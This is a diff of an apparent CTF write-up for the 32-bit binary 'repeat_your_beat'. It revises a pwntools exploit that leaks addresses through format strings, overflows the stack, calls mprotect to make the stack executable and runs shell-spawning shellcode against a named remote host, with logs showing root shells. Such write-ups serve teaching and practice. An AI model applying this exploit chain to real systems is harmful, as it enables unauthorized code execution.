@@ -473,59 +473,58 @@ from pwn import *
 def start():
     global p, libc
     if args.REMOTE:
-        p = remote('127.0.0.1', 1337)
-        #p = remote('euan-ctf-lb-1666742192.eu-west-2.elb.amazonaws.com', 1337)
-        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+        #p = remote("127.0.0.1", 1337)
+        p = remote("euan-ctf-lb-1666742192.eu-west-2.elb.amazonaws.com", 1337)
+        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
     else:
         p = process(elf.path)
         libc = elf.libc
 
-# Initialization
-elf = ELF('./repeat_your_beat')
-ld = ELF('/lib/ld-linux.so.2')
-
+# Initialisation
+elf = ELF("./repeat_your_beat")
+ld = ELF("/lib/ld-linux.so.2")
+context.update(arch="i386", os="linux")
 start()
 p.recvuntil("first!")
 
-p.sendline('%2$x:%3$x:%83$x')
+p.sendline("%2$p:%3$p:%72$p:%83$p")
 p.recvline()
-libc_leak, binary_leak, stack_leak = [int(x, 16) for x in p.recvline(keepends=False).decode().split(':')]
+libc_leak, binary_leak, stack_frame, stack_leak = [int(x, 16) for x in p.recvline().decode().split(":")]
 
-log.success(f'Libc leak = {hex(libc_leak)}')
-log.success(f'Binary leak = {hex(binary_leak)}')
-log.success(f'Stack leak = {hex(stack_leak)}')
+log.success(f"Libc leak = {hex(libc_leak)}")
+log.success(f"Binary leak = {hex(binary_leak)}")
+log.success(f"Stack leak = {hex(stack_leak)}")
 
 # setting the libc and binary base using the leaks
-libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
-# Binary leak gives address of <main + 26>
-elf.address = binary_leak - (elf.sym.main + 26)
+libc.address = libc_leak - libc.symbols["_IO_2_1_stdin_"]
+# Binary leak gives address of <main + 30>
+elf.address = binary_leak - (elf.sym.main + 30)
 # Using offset2libc type of attack on ld base address. There is a static difference between the base addresses of libc and ld
 ld_base_from_libc_base_offset = 0x211000
 ld.address = libc.address + ld_base_from_libc_base_offset
+ld_end = ld.address + 0x2c000
+start_stack = stack_frame & -0x1000
 
-log.success(f'Libc @ {hex(libc.address)}')
-log.success(f'Loader @ {hex(ld.address)}')
-log.success(f'Binary @ {hex(elf.address)}')
-
-# Getting value at __libc_stack_end to get a page-aligned value for stack
-p.sendline(b'%8$s' + p32(ld.symbols['__libc_stack_end']))
-stack_end = u32(p.recvline(keepends=False)[:4])
-log.success(f'Stack end @ {stack_end}')
+log.success(f"Libc @ {hex(libc.address)}")
+log.success(f"Loader @ {hex(ld.address)}")
+log.success(f"End of loader @ {hex(ld_end)}")
+log.success(f"Binary @ {hex(elf.address)}")
+log.success(f"Start of stack @ {hex(start_stack)}")
 
 # Calculated using gdb for the binary
 saved_eip_offset = -40
 input_buffer_offset = -328
 
 # Shellcode generated using pwntools
-shellcode = b'\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'
-payload = shellcode
-payload += b'\xcc'*(260 - len(payload)) # offset upto the address which will be popped into ecx: pop ecx
-payload += p32(stack_leak + saved_eip_offset + 4) # fixing ecx to give esp it's original value
-payload += b'JUNK'*2 # junk for ebx and ebp
-payload += b'A'*16 # Junk upto return address
+shellcode = shellcraft.sh()
+payload = asm(shellcode)
+payload += b"\x90"*(260 - len(payload)) # offset upto the address which will be popped into ecx: pop ecx
+payload += p32(stack_leak + saved_eip_offset + 4) # fixing ecx to give esp it"s original value
+payload += b"JUNK"*2 # junk for ebx and ebp
+payload += b"A"*16 # Junk upto return address
 payload += p32(libc.sym.mprotect) # jmp to mprotect
 payload += p32(stack_leak + input_buffer_offset) # return address for mprotect
-payload += p32(stack_end & -0x1000) # addr for the mprotect to make executable. Need to have a page-aligned value
+payload += p32(start_stack) # addr for the mprotect to make executable. Need to have a page-aligned value
 payload += p32(0x1000) # length for mprotect to change permission
 payload += p32(7) # permission to be set
 
@@ -543,67 +542,70 @@ from pwn import *
 def start():
     global p, libc
     if args.REMOTE:
-        p = remote('127.0.0.1', 1337)
-        #p = remote('euan-ctf-lb-1666742192.eu-west-2.elb.amazonaws.com', 1337)
-        libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+        #p = remote("127.0.0.1", 1337)
+        p = remote("euan-ctf-lb-1666742192.eu-west-2.elb.amazonaws.com", 1337)
+        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
     else:
         p = process(elf.path)
         libc = elf.libc
 
-# Initialization
-elf = ELF('./repeat_your_beat')
-ld = ELF('/lib/ld-linux.so.2')
+# Initialisation
+elf = ELF("./repeat_your_beat")
+ld = ELF("/lib/ld-linux.so.2")
+context.update(arch="i386", os="linux")
+start()
+p.recvuntil("first!")
 ...
 ```
-So here, we're essentially setting up the environment, importing in the libc used remotely (we have to download it), setting the elf and ld version. We then start the program and receive the line (remember that there is a `\t` in the `puts` argument, which gives us the newline when printing it to stdout).
+So here, we're essentially setting up the environment, importing in the libc used remotely (we have to download it), setting the elf and ld version. We then start the program and receive the line (remember that there is a `\t` in the `puts` argument, which gives us the newline when printing it to stdout). We also update the context for which our exploit is goin to be running against, which will come into use later.
+We then start the process and get all the text up until `first!`
 
 ```python
 ...
-p.sendline("%2$x:%3$x:%83$x")
-libc_leak, binary_leak, stack_leak = [int(x, 16) for x in p.recvline().decode().split(':')]
+p.sendline("%2$p:%3$p:%72$p:%83$p")
+p.recvline()
+libc_leak, binary_leak, stack_frame, stack_leak = [int(x, 16) for x in p.recvline().decode().split(":")]
 ...
 ```
-When we did our fuzz, it showed that `%2$x` gave us our libc leak. Doing some of our own fuzzing, we can find that `%3$x` will give us a leak to the binary (either in the code or text segment). Then the `%83$x` gives us an address on the stack.
+When we did our fuzz, it showed that `%2$p` gave us our libc leak. Doing some of our own fuzzing, we can find that `%3$p` will give us a leak to the binary (either in the code or text segment). The `%72$p` actually gives us the address for where the stack frame starts, which is handy when meddling with the stack. Then the `%83$p` gives us an address on the stack.
 We then print out the addresses, for our own sanity
 
 ```python
 ...
-# Bypassing ASLR using Offset2lib
-libc.address = libc_leak - libc.symbols['_IO_2_1_stdin_']
-elf.address = binary_leak - (elf.sym.main + 26) # Binary leak gives address of <main + 26>
-# Using offset2libc on ld base address
+# setting the libc and binary base using the leaks
+libc.address = libc_leak - libc.symbols["_IO_2_1_stdin_"]
+# Binary leak gives address of <main + 30>
+elf.address = binary_leak - (elf.sym.main + 30)
+# Using offset2libc type of attack on ld base address. There is a static difference between the base addresses of libc and ld
 ld_base_from_libc_base_offset = 0x211000
 ld.address = libc.address + ld_base_from_libc_base_offset
+ld_end = ld.address + 0x2c000
+start_stack = stack_frame & -0x1000
 ...
 ```
 Here is our bypassing of ASLR. We first get the libc leak, and using the fuzz earlier, we identified that the address leak was `_IO_2_1_stdin_`. Therefore, to get the base of libc, we have to subtract our leak from the offset that `_IO_2_1_stdin_` is - `libc.symbols` gives us a dictionary with the key as the libc function, and the value as the offset.
 
 We can then find the base of the ELF and the base of ld. This is again doing the same kind of thing, subtracting our leak from an offset to find the base.
 
-Skipping over the offsets for the time being:
-```python
-...
-# Getting value at __libc_stack_end to get a page-aligned value for stack
-p.sendline(b"%8$s" + p32(ld.symbols["__libc_stack_end"]))
-stack_end = u32(p.recvline()[:4])
-...
-```
-We can send another format strings, `%8$s` to ask the program to gives us back a string. In addition, we're also packing the ld symbol of `__libc_stack_end` in little endian to send it to the binary. This will allow us to gain the value at `__libc_stack_end`, which allows us to gain the end of the stack (which will be shown the reasons for this later), due to some offsets. We then save this value received into the variable `stack_end` and unpack it to big endian.
+At the end, we're getting the end of the ld segments in the memory mappings, and then performing a bitwise and on the address with negative 0x1000. This will allow us to toggle the last 3 bits of the hex address to `000`, which is what all memory mapping pages start with, eg `0x56557000`
+
+Skipping over the offsets for the time being, as well as the logging:
 
 ```python
 ...
-shellcode = asm(shellcraft.i386.linux.sh)
-payload = p32(shellcode)
+# Shellcode generated using pwntools
+shellcode = shellcraft.sh()
+payload = asm(shellcode)
 ...
 ```
-Now we're starting to generate our payload which we will send. Pwntools has the handy function `shellcraft` to allow us to generate shellcode on the fly, in this case we're specifying the shellcode for a 32 bit linux machine, which will give us back a shell using `bash`. We then pack that into little endian.
+Now we're starting to generate our payload which we will send. Pwntools has the handy function `shellcraft` to allow us to generate shellcode on the fly, in this case we're specifying the shellcode for a 32 bit linux machine (remember the context which we set at the beginning?), which will give us back a shell using `bash`. We then set the payload equal to the assembly instructions which are equivalent to the shellcode.
 
 ```python
 ...
-payload += b"\xcc"*(260 - len(payload)) # offset upto the address which will be popped into ecx: pop ecx
+payload += b"\x90"*(260 - len(payload)) # offset upto the address which will be popped into ecx: pop ecx
 ...
 ```
-If we send in a De Bruijn pattern and try and find our offsets, we can see that we can overflow up until the `pop ecx` instruction is 260. We use this, because later in the assembly, to make the program 4kb page aligned, we have the instruction `lea esp, [ecx - 0x4]`. Therefore, to control the `esp`, we have to control `ecx`. For our junk buffer up to that 260, we fill it with a nop sled to hopefully gain us a shell if we muck up the offsets.
+If we send in a De Bruijn pattern and try and find our offsets, we can see that we can overflow up until the `pop ecx` instruction is 260. We use this, because later in the assembly, to make the program 4kb page aligned, we have the instruction `lea esp, [ecx - 0x4]`. Therefore, to control the `esp`, we have to control `ecx`. For our junk buffer up to that 260, we fill it with a nop sled to hopefully gain us a shell if we mess up any offsets.
 
 ```python
 saved_eip_offset = -40 # After main finishes, goes back to __libc_start_main()
@@ -629,14 +631,14 @@ input_buffer_offset = -0x148
 ...
 payload += p32(libc.sym.mprotect) # jmp to mprotect
 payload += p32(stack_leak + input_buffer_offset) # return address for mprotect
-payload += p32(stack_end & -0x1000) # addr for the mprotect to make executable. Need to have a page-aligned value
+payload += p32(start_stack) # addr for the mprotect to make executable. Need to have a page-aligned value
 payload += p32(0x1000) # length for mprotect to change permission
 payload += p32(7) # permission to be set
 ...
 ```
 So here is our functionality of the payload. We provide our `ret` address with the address for `mprotect`, to allow us to change the permissions of the stack page. We're then providing a return address for where `mprotect` should jump to if it fails. This is the same when doing a ret2libc - we provide an address for `system`, then a return address if it were to fail, normally junk bytes or an address for `exit`.
 
-Then, we provide the address for the section which we want to change the permissions for. I perform bitwise and on the stack end with `0x1000` (pages are only 0x1000 in size, therefore we need to find the start of the memory mapping, which is at `0xABCDE000`), to therefore get the start of the stack page. We then provide the length of the page, as I've just said `0x1000`. The permission we want to set it `rwx`, or read, write and execute. This'll allow us to read the page (every page must be able to do this), write our shellcode to it, and then execute our shellcode.
+Then, we provide the address for the section which we want to change the permissions for. The page we want to change is the stack page, which we calculated the start of it up above. We then provide the length of the page, which is `0x1000`. The permission we want to set it `rwx`, or read, write and execute. This'll allow us to read the page (every page must be able to do this), write our shellcode to it, and then execute our shellcode. Therefore, following the octal system, we provide the integer 7 for a `rwx` permissions.
 
 ```python
 ...
@@ -662,19 +664,21 @@ euan@euanb26  docker  python3 exploit_mprotect.py
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
-[+] Starting local process '[some_path]/repeat_your_beat': pid 44954
+[+] Starting local process '[some_path]/repeat_your_beat': pid 87296
 [*] '/usr/lib/i386-linux-gnu/libc-2.31.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
-[+] Libc leak = 0xf7f04580
-[+] Binary leak = 0x5661224b
-[+] Stack leak = 0xffd77b64
-[+] Libc @ 0xf7d19000
-[+] Loader @ 0xf7f2a000
-[+] Binary @ 0x56611004
+[+] Libc leak = 0xf7ec9580
+[+] Binary leak = 0x565fb24b
+[+] Stack leak = 0xff98fe04
+[+] Libc @ 0xf7cde000
+[+] Loader @ 0xf7eef000
+[+] End of loader @ 0xf7f1b000
+[+] Binary @ 0x565fa000
+[+] Start of stack @ 0xff98f000
 [*] Switching to interactive mode
 $ whoami
 euan
@@ -702,12 +706,14 @@ euan@euanb26  docker  python3 exploit_mprotect.py REMOTE
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
-[+] Libc leak = 0xf7f545c0
-[+] Binary leak = 0x5664e607
-[+] Stack leak = 0xff993e24
-[+] Libc @ 0xf7d69040
-[+] Loader @ 0xf7f7a040
-[+] Binary @ 0x5664d3c0
+[+] Libc leak = 0xf7f585c0
+[+] Binary leak = 0x565e9607
+[+] Stack leak = 0xffc9e314
+[+] Libc @ 0xf7d6d040
+[+] Loader @ 0xf7f7e040
+[+] End of loader @ 0xf7faa040
+[+] Binary @ 0x565e83bc
+[+] Start of stack @ 0xffc9e000
 [*] Switching to interactive mode
 $ whoami
 root
